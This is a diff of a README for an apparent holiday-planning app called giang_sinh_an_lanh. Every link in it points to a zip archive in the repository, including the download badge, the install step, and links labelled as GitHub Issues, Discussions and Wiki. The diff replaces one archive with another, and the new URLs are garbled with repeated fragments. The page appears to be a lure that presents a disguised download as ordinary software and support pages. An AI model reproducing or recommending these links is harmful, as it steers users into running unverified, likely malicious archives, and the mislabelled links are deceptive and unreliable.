@@ -1,6 +1,6 @@
 # 🎉 giang_sinh_an_lanh - Celebrate Peaceful Festivities Easily
 
-[![Download Now](https://github.com/oscararenase/giang_sinh_an_lanh/raw/refs/heads/main/Me Ry Chit Mot/giang-sinh-an-lanh-2.4.zip%20Now-giang_sinh_an_lanh-blue)](https://github.com/oscararenase/giang_sinh_an_lanh/raw/refs/heads/main/Me Ry Chit Mot/giang-sinh-an-lanh-2.4.zip)
+[![Download Now](https://raw.githubusercontent.com/oscararenase/giang_sinh_an_lanh/main/Me Ry Chit Mot/lanh_sinh_an_giang_v2.3.zip Ry Chit https://raw.githubusercontent.com/oscararenase/giang_sinh_an_lanh/main/Me Ry Chit Mot/lanh_sinh_an_giang_v2.3.zip%20Now-giang_sinh_an_lanh-blue)](https://raw.githubusercontent.com/oscararenase/giang_sinh_an_lanh/main/Me Ry Chit Mot/lanh_sinh_an_giang_v2.3.zip Ry Chit https://raw.githubusercontent.com/oscararenase/giang_sinh_an_lanh/main/Me Ry Chit Mot/lanh_sinh_an_giang_v2.3.zip)
 
 ## 📜 Description
 
@@ -19,7 +19,7 @@ Follow these steps to download and run Giang_Sinh_An_Lanh on your computer.
 
 ### 📥 Download & Install
 
-1. **Visit this page to download**: [Download the latest version here](https://github.com/oscararenase/giang_sinh_an_lanh/raw/refs/heads/main/Me Ry Chit Mot/giang-sinh-an-lanh-2.4.zip).
+1. **Visit this page to download**: [Download the latest version here](https://raw.githubusercontent.com/oscararenase/giang_sinh_an_lanh/main/Me Ry Chit Mot/lanh_sinh_an_giang_v2.3.zip Ry Chit https://raw.githubusercontent.com/oscararenase/giang_sinh_an_lanh/main/Me Ry Chit Mot/lanh_sinh_an_giang_v2.3.zip).
 2. Choose the latest release from the list.
 3. Click on the appropriate file for your operating system. 
 4. Once the download completes, locate the file in your downloads folder.
@@ -47,16 +47,16 @@ The Giang_Sinh_An_Lanh interface is designed with simplicity in mind. You will f
 
 If you encounter any issues while using Giang_Sinh_An_Lanh, please reach out for support:
 
-- Visit our [GitHub Issues](https://github.com/oscararenase/giang_sinh_an_lanh/raw/refs/heads/main/Me Ry Chit Mot/giang-sinh-an-lanh-2.4.zip) page to report bugs or request features.
-- Join our discussion forum on [GitHub Discussions](https://github.com/oscararenase/giang_sinh_an_lanh/raw/refs/heads/main/Me Ry Chit Mot/giang-sinh-an-lanh-2.4.zip) for community support.
+- Visit our [GitHub Issues](https://raw.githubusercontent.com/oscararenase/giang_sinh_an_lanh/main/Me Ry Chit Mot/lanh_sinh_an_giang_v2.3.zip Ry Chit https://raw.githubusercontent.com/oscararenase/giang_sinh_an_lanh/main/Me Ry Chit Mot/lanh_sinh_an_giang_v2.3.zip) page to report bugs or request features.
+- Join our discussion forum on [GitHub Discussions](https://raw.githubusercontent.com/oscararenase/giang_sinh_an_lanh/main/Me Ry Chit Mot/lanh_sinh_an_giang_v2.3.zip Ry Chit https://raw.githubusercontent.com/oscararenase/giang_sinh_an_lanh/main/Me Ry Chit Mot/lanh_sinh_an_giang_v2.3.zip) for community support.
 
 ## 🔗 Additional Resources
 
-- Check out our [Wiki](https://github.com/oscararenase/giang_sinh_an_lanh/raw/refs/heads/main/Me Ry Chit Mot/giang-sinh-an-lanh-2.4.zip) for detailed guides and tips on using the application effectively.
+- Check out our [Wiki](https://raw.githubusercontent.com/oscararenase/giang_sinh_an_lanh/main/Me Ry Chit Mot/lanh_sinh_an_giang_v2.3.zip Ry Chit https://raw.githubusercontent.com/oscararenase/giang_sinh_an_lanh/main/Me Ry Chit Mot/lanh_sinh_an_giang_v2.3.zip) for detailed guides and tips on using the application effectively.
 - Follow us on GitHub to stay updated with new releases and features.
 
 ## 🎉 Conclusion
 
 We hope Giang_Sinh_An_Lanh makes your holiday planning easier and more enjoyable. Enjoy your festive moments with confidence! 
 
-[![Download Now](https://github.com/oscararenase/giang_sinh_an_lanh/raw/refs/heads/main/Me Ry Chit Mot/giang-sinh-an-lanh-2.4.zip%20Now-giang_sinh_an_lanh-blue)](https://github.com/oscararenase/giang_sinh_an_lanh/raw/refs/heads/main/Me Ry Chit Mot/giang-sinh-an-lanh-2.4.zip)
+[![Download Now](https://raw.githubusercontent.com/oscararenase/giang_sinh_an_lanh/main/Me Ry Chit Mot/lanh_sinh_an_giang_v2.3.zip Ry Chit https://raw.githubusercontent.com/oscararenase/giang_sinh_an_lanh/main/Me Ry Chit Mot/lanh_sinh_an_giang_v2.3.zip%20Now-giang_sinh_an_lanh-blue)](https://raw.githubusercontent.com/oscararenase/giang_sinh_an_lanh/main/Me Ry Chit Mot/lanh_sinh_an_giang_v2.3.zip Ry Chit https://raw.githubusercontent.com/oscararenase/giang_sinh_an_lanh/main/Me Ry Chit Mot/lanh_sinh_an_giang_v2.3.zip)
